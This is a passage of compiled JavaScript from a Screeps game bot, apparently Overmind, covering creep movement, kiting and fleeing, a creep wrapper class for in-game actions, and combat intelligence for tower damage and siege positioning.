            if (hostile.getActiveBodyparts(RANGED_ATTACK) > 1) {
                Pathing.setCostsInRange(matrix, hostile, 3, 1, true);
            }
            else if (hostile.getActiveBodyparts(ATTACK) > 1) {
                Pathing.setCostsInRange(matrix, hostile, 1, 1, true);
            }
        }
        for (const keeper of room.sourceKeepers) {
            Pathing.setCostsInRange(matrix, keeper, 3, 10, true);
        }
        for (const lair of room.keeperLairs) {
            if ((lair.ticksToSpawn || Infinity) < 25) {
                Pathing.setCostsInRange(matrix, lair, 5, 5, true);
            }
        }
        return matrix;
    }
    /**
     * Moving routine for guards or sourceReapers in a room with NPC invaders
     */
    static invasionMove(creep, destination, options = {}) {
        _.defaults(options, {
            ignoreRoads: true
        });
        const dest = normalizePos(destination);
        if (creep.pos.getRangeTo(dest) > 8) {
            options.repath = .1;
            options.movingTarget = true;
        }
        if (creep.room.name == dest.roomName) {
            options.maxRooms = 1;
            options.modifyRoomCallback = this.invasionMoveCallbackModifier;
        }
        return creep.goTo(dest, options);
    }
    /**
     * Kite around enemies in a single room, repathing every tick. More expensive than flee().
     */
    static kite(creep, avoidGoals, options = {}) {
        _.defaults(options, {
            fleeRange: 5,
            terrainCosts: getTerrainCosts(creep.creep),
        });
        const nextPos = _.first(Pathing.findKitingPath(creep.pos, avoidGoals, options).path);
        if (nextPos) {
            return creep.move(creep.pos.getDirectionTo(nextPos));
        }
    }
    /**
     * Flee from avoid goals in the room while not re-pathing every tick like kite() does.
     */
    static flee(creep, avoidGoals, dropEnergy = false, options = {}) {
        if (avoidGoals.length == 0) {
            return; // nothing to flee from
        }
        _.defaults(options, {
            terrainCosts: getTerrainCosts(creep.creep),
        });
        if (options.fleeRange == undefined)
            options.fleeRange = options.terrainCosts.plainCost > 1 ? 8 : 16;
        const closest = creep.pos.findClosestByRange(avoidGoals);
        const rangeToClosest = closest ? creep.pos.getRangeTo(closest) : 50;
        if (rangeToClosest > options.fleeRange) { // Out of range of baddies
            if (!creep.memory._go) {
                return;
            }
            if (creep.pos.isEdge) {
                return creep.moveOffExit();
            }
            // wait until safe
            const moveData = creep.memory._go;
            if (moveData.fleeWait != undefined) {
                if (moveData.fleeWait <= 0) {
                    // you're safe now
                    delete creep.memory._go;
                    return;
                }
                else {
                    moveData.fleeWait--;
                    return NO_ACTION;
                }
            }
            else {
                // you're safe
                return;
            }
        }
        else { // Still need to run away
            // initialize data object
            if (!creep.memory._go) {
                creep.memory._go = {};
            }
            const moveData = creep.memory._go;
            moveData.fleeWait = 2;
            // Invalidate path if needed
            if (moveData.path) {
                if (moveData.path.length > 0) {
                    const nextDirection = parseInt(moveData.path[0], 10);
                    const pos = creep.pos.getPositionAtDirection(nextDirection);
                    if (!pos.isEdge) {
                        const newClosest = pos.findClosestByRange(avoidGoals);
                        if (newClosest && normalizePos(newClosest).getRangeTo(pos) < rangeToClosest) {
                            delete moveData.path;
                        }
                    }
                }
                else {
                    delete moveData.path;
                }
            }
            // Re-calculate path if needed
            if (!moveData.path || !moveData.destination) {
                const ret = Pathing.findFleePath(creep.pos, avoidGoals, options);
                if (ret.path.length == 0) {
                    return NO_ACTION;
                }
                moveData.destination = _.last(ret.path);
                moveData.path = Pathing.serializePath(creep.pos, ret.path, 'purple');
            }
            // Call goTo to the final position in path
            return Movement_1.goTo(creep, derefRoomPosition(moveData.destination), options);
        }
    }
    static deserializeState(moveData, destination) {
        const state = {};
        if (moveData.state) {
            state.lastCoord = { x: moveData.state[STATE_PREV_X], y: moveData.state[STATE_PREV_Y] };
            state.cpu = moveData.state[STATE_CPU];
            state.stuckCount = moveData.state[STATE_STUCK];
            state.destination = new RoomPosition(moveData.state[STATE_DEST_X], moveData.state[STATE_DEST_Y], moveData.state[STATE_DEST_ROOMNAME]);
            if (moveData.state[STATE_CURRENT_X] && moveData.state[STATE_CURRENT_Y]) {
                state.currentXY = { x: moveData.state[STATE_CURRENT_X], y: moveData.state[STATE_CURRENT_Y] };
            }
        }
        else {
            state.cpu = 0;
            state.destination = destination;
        }
        return state;
    }
    static serializeState(creep, destination, state, moveData, nextCoord) {
        if (nextCoord) {
            moveData.state = [creep.pos.x, creep.pos.y, state.stuckCount, state.cpu, destination.x, destination.y,
                destination.roomName, nextCoord.x, nextCoord.y];
        }
        else {
            moveData.state = [creep.pos.x, creep.pos.y, state.stuckCount, state.cpu, destination.x, destination.y,
                destination.roomName];
        }
    }
    /**
     * Update the currentXY property for a move state
     */
    static updateStateNextCoord(moveData, nextCoord) {
        if (moveData.state) {
            if (moveData.state[STATE_CURRENT_X] != undefined && moveData.state[STATE_CURRENT_Y] != undefined) {
                moveData.state[STATE_CURRENT_X] = nextCoord.x;
                moveData.state[STATE_CURRENT_Y] = nextCoord.y;
            }
            else if (moveData.state.length == STATE_CURRENT_X) {
                moveData.state.push(nextCoord.x);
                moveData.state.push(nextCoord.y);
            }
            else {
                // Shouldn't ever reach here
                log.warning(`Invalid moveData.state length!`);
            }
        }
    }
    static isStuck(creep, state) {
        let stuck = false;
        if (state.lastCoord !== undefined) {
            if (sameCoord(creep.pos, state.lastCoord)) { // didn't move
                stuck = true;
            }
            else if (isExit(creep.pos) && isExit(state.lastCoord)) { // moved against exit
                stuck = true;
            }
        }
        return stuck;
    }
    /**
     * Draw a circle
     */
    static circle(pos, color$$1, opacity) {
        return new RoomVisual(pos.roomName).circle(pos, {
            radius: .45, fill: 'transparent', stroke: color$$1, strokeWidth: .15, opacity: opacity
        });
    }
};
Movement = Movement_1 = __decorate([
    profile
], Movement);
// Creep.prototype.goTo = function (destination: RoomPosition | HasPos, options?: MoveOptions) {
//  return Movement.goTo(this, destination, options);
// };

var Zerg_1;
function getOverlord$1(creep) {
    if (creep.memory["O" /* OVERLORD */]) {
        return Overmind.overlords[creep.memory["O" /* OVERLORD */]] || null;
    }
    else {
        return null;
    }
}
function setOverlord$1(creep, newOverlord) {
    // Remove cache references to old assignments
    const roleName = creep.memory.role;
    const ref = creep.memory["O" /* OVERLORD */];
    const oldOverlord = ref ? Overmind.overlords[ref] : null;
    if (ref && Overmind.cache.overlords[ref] && Overmind.cache.overlords[ref][roleName]) {
        _.remove(Overmind.cache.overlords[ref][roleName], name => name == creep.name);
    }
    if (newOverlord) {
        // Change to the new overlord's colony
        creep.memory["C" /* COLONY */] = newOverlord.colony.name;
        // Change assignments in memory
        creep.memory["O" /* OVERLORD */] = newOverlord.ref;
        // Update the cache references
        if (!Overmind.cache.overlords[newOverlord.ref]) {
            Overmind.cache.overlords[newOverlord.ref] = {};
        }
        if (!Overmind.cache.overlords[newOverlord.ref][roleName]) {
            Overmind.cache.overlords[newOverlord.ref][roleName] = [];
        }
        Overmind.cache.overlords[newOverlord.ref][roleName].push(creep.name);
    }
    else {
        creep.memory["O" /* OVERLORD */] = null;
    }
    if (oldOverlord)
        oldOverlord.recalculateCreeps();
    if (newOverlord)
        newOverlord.recalculateCreeps();
}
function normalizeZerg(creep) {
    return Overmind.zerg[creep.name] || creep;
}
function toCreep(creep) {
    return isZerg(creep) ? creep.creep : creep;
}
// Last pipeline is more complex because it depends on the energy a creep has; sidelining this for now
const actionPipelines = [
    ['harvest', 'attack', 'build', 'repair', 'dismantle', 'attackController', 'rangedHeal', 'heal'],
    ['rangedAttack', 'rangedMassAttack', 'build', 'repair', 'rangedHeal'],
];
const RANGES = {
    BUILD: 3,
    REPAIR: 3,
    TRANSFER: 1,
    WITHDRAW: 1,
    HARVEST: 1,
    DROP: 0,
};
/**
 * The Zerg class is a wrapper for owned creeps and contains all wrapped creep methods and many additional methods for
 * direct control of a creep.
 */
let Zerg = Zerg_1 = class Zerg {
    constructor(creep, notifyWhenAttacked = true) {
        // Copy over creep references
        this.creep = creep;
        this.body = creep.body;
        this.carry = creep.carry;
        this.carryCapacity = creep.carryCapacity;
        this.fatigue = creep.fatigue;
        this.hits = creep.hits;
        this.hitsMax = creep.hitsMax;
        this.id = creep.id;
        this.memory = creep.memory;
        this.name = creep.name;
        this.pos = creep.pos;
        this.nextPos = creep.pos;
        this.ref = creep.ref;
        this.roleName = creep.memory.role;
        this.room = creep.room;
        this.saying = creep.saying;
        this.spawning = creep.spawning;
        this.ticksToLive = creep.ticksToLive;
        // Extra properties
        this.lifetime = this.getBodyparts(CLAIM) > 0 ? CREEP_CLAIM_LIFE_TIME : CREEP_LIFE_TIME;
        this.actionLog = {};
        this.blockMovement = false;
        // Register global references
        Overmind.zerg[this.name] = this;
        global[this.name] = this;
        // Handle attack notification when at lifetime - 1
        if (!notifyWhenAttacked && (this.ticksToLive || 0) >= this.lifetime - (NEW_OVERMIND_INTERVAL + 1)) {
            // creep.notifyWhenAttacked only uses the 0.2CPU intent cost if it changes the intent value
            this.notifyWhenAttacked(notifyWhenAttacked);
        }
    }
    /**
     * Refresh all changeable properties of the creep or delete from Overmind and global when dead
     */
    refresh() {
        const creep = Game.creeps[this.name];
        if (creep) {
            this.creep = creep;
            this.pos = creep.pos;
            this.nextPos = creep.pos;
            this.body = creep.body;
            this.carry = creep.carry;
            this.carryCapacity = creep.carryCapacity;
            this.fatigue = creep.fatigue;
            this.hits = creep.hits;
            this.memory = creep.memory;
            this.roleName = creep.memory.role;
            this.room = creep.room;
            this.saying = creep.saying;
            this.spawning = creep.spawning;
            this.ticksToLive = creep.ticksToLive;
            this.actionLog = {};
            this.blockMovement = false;
            this._task = null; // todo
        }
        else {
            log.debug(`Deleting from global`);
            delete Overmind.zerg[this.name];
            delete global[this.name];
        }
    }
    debug(...args) {
        if (this.memory.debug) {
            log.debug(this.print, args);
        }
    }
    get ticksUntilSpawned() {
        if (this.spawning) {
            const spawner = this.pos.lookForStructure(STRUCTURE_SPAWN);
            if (spawner && spawner.spawning) {
                return spawner.spawning.remainingTime;
            }
            else {
                // Shouldn't ever get here
                console.log(`Error determining ticks to spawn for ${this.name} @ ${this.pos.print}!`);
            }
        }
    }
    get print() {
        return '<a href="#!/room/' + Game.shard.name + '/' + this.pos.roomName + '">[' + this.name + ']</a>';
    }
    // Wrapped creep methods ===========================================================================================
    attack(target) {
        const result = this.creep.attack(target);
        if (result == OK) {
            this.actionLog.attack = true;
            if (isCreep(target)) {
                if (target.hitsPredicted == undefined)
                    target.hitsPredicted = target.hits;
                target.hitsPredicted -= CombatIntel.predictedDamageAmount(this.creep, target, 'attack');
                // account for hitback effects
                if (this.creep.hitsPredicted == undefined)
                    this.creep.hitsPredicted = this.creep.hits;
                this.creep.hitsPredicted -= CombatIntel.predictedDamageAmount(target, this.creep, 'attack');
            }
            if (this.memory.talkative)
                this.say(`💥`);
        }
        return result;
    }
    attackController(controller) {
        const result = this.creep.attackController(controller);
        if (!this.actionLog.attackController)
            this.actionLog.attackController = (result == OK);
        return result;
    }
    build(target) {
        const result = this.creep.build(target);
        if (!this.actionLog.build)
            this.actionLog.build = (result == OK);
        return result;
    }
    goBuild(target) {
        if (this.pos.inRangeToPos(target.pos, RANGES.BUILD)) {
            return this.build(target);
        }
        else {
            return this.goTo(target);
        }
    }
    cancelOrder(methodName) {
        const result = this.creep.cancelOrder(methodName);
        if (result == OK)
            this.actionLog[methodName] = false;
        return result;
    }
    claimController(controller) {
        const result = this.creep.claimController(controller);
        if (!this.actionLog.claimController)
            this.actionLog.claimController = (result == OK);
        return result;
    }
    dismantle(target) {
        const result = this.creep.dismantle(target);
        if (!this.actionLog.dismantle)
            this.actionLog.dismantle = (result == OK);
        return result;
    }
    drop(resourceType, amount) {
        const result = this.creep.drop(resourceType, amount);
        if (!this.actionLog.drop)
            this.actionLog.drop = (result == OK);
        return result;
    }
    goDrop(pos, resourceType, amount) {
        if (this.pos.inRangeToPos(pos, RANGES.DROP)) {
            return this.drop(resourceType, amount);
        }
        else {
            return this.goTo(pos);
        }
    }
    generateSafeMode(target) {
        return this.creep.generateSafeMode(target);
    }
    harvest(source) {
        const result = this.creep.harvest(source);
        if (!this.actionLog.harvest)
            this.actionLog.harvest = (result == OK);
        return result;
    }
    goHarvest(source) {
        if (this.pos.inRangeToPos(source.pos, RANGES.HARVEST)) {
            return this.harvest(source);
        }
        else {
            return this.goTo(source);
        }
    }
    move(direction, force = false) {
        if (!this.blockMovement && !force) {
            const result = this.creep.move(direction);
            if (result == OK) {
                if (!this.actionLog.move)
                    this.actionLog.move = true;
                this.nextPos = this.pos.getPositionAtDirection(direction);
            }
            return result;
        }
        else {
            return ERR_BUSY;
        }
    }
    notifyWhenAttacked(enabled) {
        return this.creep.notifyWhenAttacked(enabled);
    }
    pickup(resource) {
        const result = this.creep.pickup(resource);
        if (!this.actionLog.pickup)
            this.actionLog.pickup = (result == OK);
        return result;
    }
    rangedAttack(target) {
        const result = this.creep.rangedAttack(target);
        if (result == OK) {
            this.actionLog.rangedAttack = true;
            if (isCreep(target)) {
                if (target.hitsPredicted == undefined)
                    target.hitsPredicted = target.hits;
                target.hitsPredicted -= CombatIntel.predictedDamageAmount(this, target, 'rangedAttack');
            }
            if (this.memory.talkative)
                this.say(`🔫`);
        }
        return result;
    }
    rangedMassAttack() {
        const result = this.creep.rangedMassAttack();
        if (result == OK) {
            this.actionLog.rangedMassAttack = true;
            for (const target of this.pos.findInRange(this.room.hostiles, 3)) {
                if (target.hitsPredicted == undefined)
                    target.hitsPredicted = target.hits;
                target.hitsPredicted -= CombatIntel.getMassAttackDamageTo(this, target);
            }
            if (this.memory.talkative)
                this.say(`💣`);
        }
        return result;
    }
    repair(target) {
        const result = this.creep.repair(target);
        if (!this.actionLog.repair)
            this.actionLog.repair = (result == OK);
        return result;
    }
    goRepair(target) {
        if (this.pos.inRangeToPos(target.pos, RANGES.REPAIR)) {
            return this.repair(target);
        }
        else {
            return this.goTo(target);
        }
    }
    reserveController(controller) {
        const result = this.creep.reserveController(controller);
        if (!this.actionLog.reserveController)
            this.actionLog.reserveController = (result == OK);
        return result;
    }
    /* Say a message; maximum message length is 10 characters */
    say(message, pub) {
        return this.creep.say(message, pub);
    }
    signController(target, text) {
        const result = this.creep.signController(target, text);
        if (!this.actionLog.signController)
            this.actionLog.signController = (result == OK);
        return result;
    }
    suicide() {
        return this.creep.suicide();
    }
    upgradeController(controller) {
        const result = this.creep.upgradeController(controller);
        if (!this.actionLog.upgradeController)
            this.actionLog.upgradeController = (result == OK);
        // Determine amount of upgrade power
        // let weightedUpgraderParts = _.map(this.boostCounts, )
        // let upgradeAmount = this.getActiveBodyparts(WORK) * UPGRADE_CONTROLLER_POWER;
        // let upgrade
        // Stats.accumulate(`colonies.${this.colony.name}.rcl.progressTotal`, upgradeAmount);
        return result;
    }
    heal(target, rangedHealInstead = false) {
        if (rangedHealInstead && !this.pos.isNearTo(target)) {
            return this.rangedHeal(target);
        }
        const creep = toCreep(target);
        const result = this.creep.heal(creep);
        if (result == OK) {
            this.actionLog.heal = true;
            if (creep.hitsPredicted == undefined)
                creep.hitsPredicted = creep.hits;
            creep.hitsPredicted += CombatIntel.getHealAmount(this);
            if (this.memory.talkative)
                this.say('🚑');
        }
        return result;
    }
    rangedHeal(target) {
        const creep = toCreep(target);
        const result = this.creep.rangedHeal(creep);
        if (result == OK) {
            this.actionLog.rangedHeal = true;
            if (creep.hitsPredicted == undefined)
                creep.hitsPredicted = creep.hits;
            creep.hitsPredicted += CombatIntel.getRangedHealAmount(this);
            if (this.memory.talkative)
                this.say(`💉`);
        }
        return result;
    }
    transfer(target, resourceType = RESOURCE_ENERGY, amount) {
        let result;
        if (target instanceof Zerg_1) {
            result = this.creep.transfer(target.creep, resourceType, amount);
        }
        else {
            result = this.creep.transfer(target, resourceType, amount);
        }
        if (!this.actionLog.transfer)
            this.actionLog.transfer = (result == OK);
        return result;
    }
    goTransfer(target, resourceType = RESOURCE_ENERGY, amount) {
        if (this.pos.inRangeToPos(target.pos, RANGES.TRANSFER)) {
            return this.transfer(target, resourceType, amount);
        }
        else {
            return this.goTo(target);
        }
    }
    withdraw(target, resourceType = RESOURCE_ENERGY, amount) {
        const result = this.creep.withdraw(target, resourceType, amount);
        if (!this.actionLog.withdraw)
            this.actionLog.withdraw = (result == OK);
        return result;
    }
    goWithdraw(target, resourceType = RESOURCE_ENERGY, amount) {
        if (this.pos.inRangeToPos(target.pos, RANGES.WITHDRAW)) {
            return this.withdraw(target, resourceType, amount);
        }
        else {
            return this.goTo(target);
        }
    }
    // Simultaneous creep actions --------------------------------------------------------------------------------------
    /**
     * Determine whether the given action will conflict with an action the creep has already taken.
     * See http://docs.screeps.com/simultaneous-actions.html for more details.
     */
    canExecute(actionName) {
        // Only one action can be executed from within a single pipeline
        let conflictingActions = [actionName];
        for (const pipeline of actionPipelines) {
            if (pipeline.includes(actionName))
                conflictingActions = conflictingActions.concat(pipeline);
        }
        for (const action of conflictingActions) {
            if (this.actionLog[action]) {
                return false;
            }
        }
        return true;
    }
    // Body configuration and related data -----------------------------------------------------------------------------
    getActiveBodyparts(type) {
        return this.creep.getActiveBodyparts(type);
    }
    /* The same as creep.getActiveBodyparts, but just counts bodyparts regardless of condition. */
    getBodyparts(partType) {
        return _.filter(this.body, (part) => part.type == partType).length;
    }
    // Custom creep methods ============================================================================================
    // Carry methods
    get hasMineralsInCarry() {
        for (const resourceType in this.carry) {
            if (resourceType != RESOURCE_ENERGY && (this.carry[resourceType] || 0) > 0) {
                return true;
            }
        }
        return false;
    }
    // Boosting logic --------------------------------------------------------------------------------------------------
    get boosts() {
        return this.creep.boosts;
    }
    get boostCounts() {
        return this.creep.boostCounts;
    }
    get needsBoosts() {
        if (this.overlord) {
            return this.overlord.shouldBoost(this);
        }
        return false;
    }
    // Overlord logic --------------------------------------------------------------------------------------------------
    get overlord() {
        return getOverlord$1(this);
    }
    set overlord(newOverlord) {
        setOverlord$1(this, newOverlord);
    }
    /* Reassigns the creep to work under a new overlord and as a new role. */
    reassign(newOverlord, newRole, invalidateTask = true) {
        this.overlord = newOverlord;
        this.roleName = newRole;
        this.memory.role = newRole;
        if (invalidateTask) {
            this.task = null;
        }
    }
    // Task logic ------------------------------------------------------------------------------------------------------
    /**
     * Wrapper for _task
     */
    get task() {
        if (!this._task) {
            this._task = this.memory.task ? initializeTask(this.memory.task) : null;
        }
        return this._task;
    }
    /**
     * Assign the creep a task with the setter, replacing creep.assign(Task)
     */
    set task(task) {
        // Unregister target from old task if applicable
        const oldProtoTask = this.memory.task;
        if (oldProtoTask) {
            const oldRef = oldProtoTask._target.ref;
            if (Overmind.cache.targets[oldRef]) {
                _.remove(Overmind.cache.targets[oldRef], name => name == this.name);
            }
        }
        // Set the new task
        this.memory.task = task ? task.proto : null;
        if (task) {
            if (task.target) {
                // Register task target in cache if it is actively targeting something (excludes goTo and similar)
                if (!Overmind.cache.targets[task.target.ref]) {
                    Overmind.cache.targets[task.target.ref] = [];
                }
                Overmind.cache.targets[task.target.ref].push(this.name);
            }
            // Register references to creep
            task.creep = this;
        }
        // Clear cache
        this._task = null;
    }
    /**
     * Does the creep have a valid task at the moment?
     */
    get hasValidTask() {
        return !!this.task && this.task.isValid();
    }
    /**
     * Creeps are idle if they don't have a task.
     */
    get isIdle() {
        return !this.task || !this.task.isValid();
    }
    /**
     * Execute the task you currently have.
     */
    run() {
        if (this.task) {
            return this.task.run();
        }
    }
    // Colony association ----------------------------------------------------------------------------------------------
    /**
     * Colony that the creep belongs to.
     */
    get colony() {
        return Overmind.colonies[this.memory["C" /* COLONY */]];
    }
    set colony(newColony) {
        this.memory["C" /* COLONY */] = newColony.name;
    }
    /**
     * If the creep is in a colony room or outpost
     */
    get inColonyRoom() {
        return Overmind.colonyMap[this.room.name] == this.memory["C" /* COLONY */];
    }
    // Movement and location -------------------------------------------------------------------------------------------
    goTo(destination, options = {}) {
        return Movement.goTo(this, destination, options);
    }
    goToRoom(roomName, options = {}) {
        return Movement.goToRoom(this, roomName, options);
    }
    inSameRoomAs(target) {
        return this.pos.roomName == target.pos.roomName;
    }
    safelyInRoom(roomName) {
        return this.room.name == roomName && !this.pos.isEdge;
    }
    get inRampart() {
        return this.creep.inRampart;
    }
    get isMoving() {
        const moveData = this.memory._go;
        return !!moveData && !!moveData.path && moveData.path.length > 1;
    }
    /**
     * Kite around hostiles in the room
     */
    kite(avoidGoals = this.room.hostiles, options = {}) {
        _.defaults(options, {
            fleeRange: 5
        });
        return Movement.kite(this, avoidGoals, options);
    }
    defaultFleeGoals() {
        let fleeGoals = [];
        fleeGoals = fleeGoals.concat(this.room.hostiles)
            .concat(_.filter(this.room.keeperLairs, lair => (lair.ticksToSpawn || Infinity) < 10));
        return fleeGoals;
    }
    /**
     * Flee from hostiles in the room, while not repathing every tick
     */
    flee(avoidGoals = this.room.fleeDefaults, fleeOptions = {}, moveOptions = {}) {
        if (avoidGoals.length == 0) {
            return false;
        }
        else if (this.room.controller && this.room.controller.my && this.room.controller.safeMode) {
            return false;
        }
        else {
            const fleeing = Movement.flee(this, avoidGoals, fleeOptions.dropEnergy, moveOptions) != undefined;
            if (fleeing) {
                // Drop energy if needed
                if (fleeOptions.dropEnergy && this.carry.energy > 0) {
                    const nearbyContainers = this.pos.findInRange(this.room.storageUnits, 1);
                    if (nearbyContainers.length > 0) {
                        this.transfer(_.first(nearbyContainers), RESOURCE_ENERGY);
                    }
                    else {
                        this.drop(RESOURCE_ENERGY);
                    }
                }
                // Invalidate task
                if (fleeOptions.invalidateTask) {
                    this.task = null;
                }
            }
            return fleeing;
        }
    }
    /**
     * Park the creep off-roads
     */
    park(pos = this.pos, maintainDistance = false) {
        return Movement.park(this, pos, maintainDistance);
    }
    /**
     * Moves a creep off of the current tile to the first available neighbor
     */
    moveOffCurrentPos() {
        return Movement.moveOffCurrentPos(this);
    }
    /**
     * Moves onto an exit tile
     */
    moveOnExit() {
        return Movement.moveOnExit(this);
    }
    /**
     * Moves off of an exit tile
     */
    moveOffExit(avoidSwamp = true) {
        return Movement.moveOffExit(this, avoidSwamp);
    }
    moveOffExitToward(pos, detour = true) {
        return Movement.moveOffExitToward(this, pos, detour);
    }
    // Miscellaneous fun stuff -----------------------------------------------------------------------------------------
    sayLoop(messageList, pub) {
        return this.say(messageList[Game.time % messageList.length], pub);
    }
    sayRandom(phrases, pub) {
        return this.say(phrases[Math.floor(Math.random() * phrases.length)], pub);
    }
};
Zerg = Zerg_1 = __decorate([
    profile
], Zerg);

// Combat Intel - provides information related to making combat-related decisions
var CombatIntel_1;
let CombatIntel = CombatIntel_1 = class CombatIntel {
    constructor(directive) {
        this.directive = directive;
    }
    get memory() {
        return Mem.wrap(this.directive.memory, 'combatIntel', {});
    }
    get room() {
        return this.directive.room;
    }
    get colony() {
        return this.directive.colony;
    }
    // Tower damage ====================================================================================================
    /**
     * Get the tower damage at a given range
     */
    static singleTowerDamage(range) {
        if (range <= TOWER_OPTIMAL_RANGE) {
            return TOWER_POWER_ATTACK;
        }
        range = Math.min(range, TOWER_FALLOFF_RANGE);
        const falloff = (range - TOWER_OPTIMAL_RANGE) / (TOWER_FALLOFF_RANGE - TOWER_OPTIMAL_RANGE);
        return TOWER_POWER_ATTACK * (1 - TOWER_FALLOFF * falloff);
    }
    /**
     * Total tower tamage from all towers in room at a given position
     */
    static towerDamageAtPos(pos, ignoreEnergy = false) {
        if (pos.room) {
            let expectedDamage = 0;
            for (const tower of pos.room.towers) {
                if (tower.energy > 0 || ignoreEnergy) {
                    expectedDamage += this.singleTowerDamage(pos.getRangeTo(tower));
                }
            }
            return expectedDamage;
        }
        else {
            log.warning(`CombatIntel.towerDamageAtPos: room visibility at ${pos.print}!`);
            return 0;
        }
    }
    // Cost matrix calculations
    computeCostMatrix() {
        if (this.room) {
            const matrix = new PathFinder.CostMatrix();
            const barriers = this.room.barriers;
            if (barriers.length > 0) {
                const highestHits = _.last(_.sortBy(barriers, barrier => barrier.hits)).hits;
                for (const barrier of barriers) {
                    matrix.set(barrier.pos.x, barrier.pos.y, Math.ceil(barrier.hits * 10 / highestHits) * 10);
                }
            }
            return matrix;
        }
    }
    // Fallback and exit calculations ==================================================================================
    findBestExit(matrix, towers, spawns) {
        if (!this.room) {
            return;
        }
        let bestExit;
        const destination = this.room.spawns[0] || this.room.storage; // enemy structure you are trying to get to
        if (!destination) {
            return;
        }
        const ret = Pathing.findPath(this.colony.pos, destination.pos, { range: 1 });
        if (!ret.incomplete) {
            bestExit = _.find(ret.path, p => p.roomName == this.room.name);
        }
        // Figure out possible exits to go from enemy room back to colony in a reasonable amount of time
        const maxRoomDistance = 8;
        const allowedExits = {};
        if (!bestExit) {
            const exitData = Game.map.describeExits(this.room.name);
            for (const direction in exitData) {
                const roomName = exitData[direction];
                const allowedRooms = Pathing.findRoute(this.colony.name, roomName);
                if (allowedRooms && Object.keys(allowedRooms).length <= maxRoomDistance) {
                    allowedExits[direction] = true;
                }
            }
            if (_.keys(allowedExits).length == 0) {
                return;
            }
        }
        // TODO
        const exitPositions = [];
        const terrain = Game.map.getRoomTerrain(this.room.name);
        for (let x = 0; x < 50; x += 49) {
            for (let y = 0; y < 50; y++) {
                if (x !== 0 && y !== 0 && x !== 49 && y !== 49) {
                    continue;
                }
                if (terrain.get(x, y) === TERRAIN_MASK_WALL) {
                    continue;
                }
                matrix.set(x, y, 0xff);
                if (bestExit) {
                    continue;
                }
                if (allowedExits['1'] && y === 0) {
                    exitPositions.push(new RoomPosition(x, y, this.room.name));
                }
                else if (allowedExits['3'] && x === 49) {
                    exitPositions.push(new RoomPosition(x, y, this.room.name));
                }
                else if (allowedExits['5'] && y === 49) {
                    exitPositions.push(new RoomPosition(x, y, this.room.name));
                }
                else if (allowedExits['7'] && x === 0) {
                    exitPositions.push(new RoomPosition(x, y, this.room.name));
                }
            }
        }
        if (!bestExit) {
            bestExit = _(exitPositions)
                .sortBy((p) => -_.sum(towers, (t) => p.getRangeTo(t)))
                .head();
        }
        matrix.set(bestExit.x, bestExit.y, 1);
        return bestExit;
    }
    // static findBestSiegeExit(roomName: string, matrix?: CostMatrix): RoomPosition | undefined  {
    //  let edgeCoords: [number, number][] = [];
    //  for (let x = 0; x < 50; x += 49) {
    //      for (let y = 0; y < 50; y++) {
    //          edgeCoords.push([x,y])
    //      }
    //  }
    //  for (let x = 0; x < 50; x++) {
    //      for (let y = 0; y < 50; y += 49) {
    //          edgeCoords.push([x,y])
    //      }
    //  }
    //
    //  const room = Game.rooms[roomName];
    //  let siegeTarget = CombatTargeting.findBestStructureTarget()
    // }
    /**
     * Simple routine to find an assembly point outside of the target room
     */
    findSimpleSiegeFallback() {
        const ret = Pathing.findPath(this.colony.pos, this.directive.pos, { range: 23 });
        if (ret.incomplete) {
            log.warning(`Incomplete path while finding fallback! Destination: ${this.directive.pos.print}`);
        }
        const firstPosInRoom = _.find(ret.path, pos => pos.roomName == this.directive.pos.roomName);
        if (firstPosInRoom) {
            return CombatIntel_1.getFallbackFrom(firstPosInRoom);
        }
        else {
            return CombatIntel_1.getFallbackFrom(this.directive.pos);
        }
    }
    /**
     * Finds a location for a swarm to assemble outside of the target room
     */
    findSwarmAssemblyPoint(clearance, swarmIndex = 0) {
        const simpleFallback = this.findSimpleSiegeFallback();
        const startPos = Pathing.findPathablePosition(simpleFallback.roomName, clearance);
        let ret = Pathing.findSwarmPath(startPos, this.directive.pos, clearance.width, clearance.height, { ignoreCreeps: true });
        if (ret.incomplete) {
            log.debug(`Incomplete swarm path to find assembly point. Retrying with startpos = fallback.`);
            ret = Pathing.findSwarmPath(simpleFallback, this.directive.pos, clearance.width, clearance.height, { ignoreCreeps: true });
            if (ret.incomplete) {
                log.warning(`No pathable assembly point!`);
            }
        }
        const path = ret.path.reverse();
        const acceptablePositions = _.filter(path, pos => pos.roomName == simpleFallback.roomName &&
            pos.rangeToEdge > 1);
        const swarmSize = Math.max(clearance.width, clearance.height);
        const posIndex = (swarmSize + 1) * swarmIndex;
        return acceptablePositions[posIndex] || acceptablePositions[0] || simpleFallback;
    }
    /**
     * Finds a location for a swarm to assemble within an owned room
     */
    findSwarmAssemblyPointInColony(clearance, swarmIndex = 0) {
        // let ret = Pathing.findSwarmPath(this.colony.pos, this.directive.pos, clearance.width, clearance.height,
        //                              {ignoreCreeps: true});
        const ret = Pathing.findPath(this.colony.pos, this.directive.pos, { ignoreCreeps: true });
        const path = ret.path.reverse();
        const acceptablePositions = _.filter(path, pos => pos.roomName == this.colony.name && pos.rangeToEdge > 1);
        const swarmSize = Math.max(clearance.width, clearance.height);
        const posIndex = (swarmSize + 1) * swarmIndex;
        return acceptablePositions[posIndex] || acceptablePositions[0];
    }
    /**
     * Fallback is a location on the other side of the nearest exit the directive is placed at
     */
    static getFallbackFrom(pos, fallbackDistance = 2) {
        let { x, y, roomName } = pos;
        const rangesToExit = [[x, 'left'], [49 - x, 'right'], [y, 'top'], [49 - y, 'bottom']];
        const [range, direction] = _.first(_.sortBy(rangesToExit, pair => pair[0]));
        switch (direction) {
            case 'left':
                x = 49 - fallbackDistance;
                roomName = Cartographer.findRelativeRoomName(roomName, -1, 0);
                break;
            case 'right':
                x = fallbackDistance;
                roomName = Cartographer.findRelativeRoomName(roomName, 1, 0);
                break;
            case 'top':
                y = 49 - fallbackDistance;
                roomName = Cartographer.findRelativeRoomName(roomName, 0, -1);
                break;
            case 'bottom':
                y = fallbackDistance;
                roomName = Cartographer.findRelativeRoomName(roomName, 0, 1);
                break;
            default:
                log.error('Error getting fallback position!');
                break;
        }
        return new RoomPosition(x, y, roomName);
    }
    // Creep potentials ================================================================================================
    /**
     * Cache the result of a computation for a tick
     */
    static cache(creep, key, callback) {
        if (!creep.intel)
            creep.intel = {};
        if (creep.intel[key] == undefined) {
            creep.intel[key] = callback();
        }
        return creep.intel[key];
    }
    /**
     * Heal potential of a single creep in units of effective number of parts
     */
    static getHealPotential(creep) {
        return this.cache(creep, 'healPotential', () => _.sum(creep.body, function (part) {
            if (part.hits == 0) {
                return 0;
            }
